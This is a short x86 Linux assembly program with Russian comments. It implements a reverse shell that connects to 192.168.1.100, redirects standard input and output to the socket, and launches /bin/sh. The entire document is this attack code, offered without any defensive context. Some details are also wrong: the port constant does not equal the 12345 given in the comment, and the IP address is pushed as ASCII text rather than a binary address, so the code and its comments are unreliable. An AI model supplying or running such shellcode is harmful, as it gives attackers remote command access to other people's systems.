section .data
    server_ip db "192.168.1.100" ; IP сервера для подключения
    port dw 0x5C11 ; Порт сервера (12345) в формате little-endian
section .text
    global _start
_start:
    ; Создаем сокет (системный вызов socket)
    xor eax, eax
    push eax
    push byte 1
    push byte 2
    mov al, 0x66 ; системный вызов socketcall
    mov bl, 0x1  ; NET_SOCKET (создание сокета)
    mov ecx, esp
    int 0x80
    ; Сохраняем дескриптор сокета
    xchg ebx, eax
    ; Структура sockaddr_in
    push word [port] ; Порт
    push dword [server_ip] ; IP адрес
    push word 0x2 ; AF_INET (IPv4)
    mov ecx, esp
    ; Подключаемся к серверу (системный вызов connect)
    push byte 16 ; размер структуры sockaddr
    push ecx     ; указатель на структуру sockaddr
    push ebx     ; дескриптор сокета
    mov al, 0x66 ; системный вызов socketcall
    mov bl, 0x3  ; NET_CONNECT (соединение с сервером)
    mov ecx, esp
    int 0x80
    ; Перенаправляем stdin, stdout, stderr в сокет
    ; Дублируем дескрипторы сокета
    xor ecx, ecx
dup2_loop:
    mov al, 0x3f ; системный вызов dup2
    int 0x80
    inc cl ; увеличиваем ECX для следующего дескриптора
    cmp cl, 0x2
    jle dup2_loop
    ; Выполняем /bin/sh
    xor eax, eax
    push eax
    push 0x68732f2f ; //sh
    push 0x6e69622f ; /bin
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    mov al, 0xb ; системный вызов execve
    int 0x80
; Конец программы
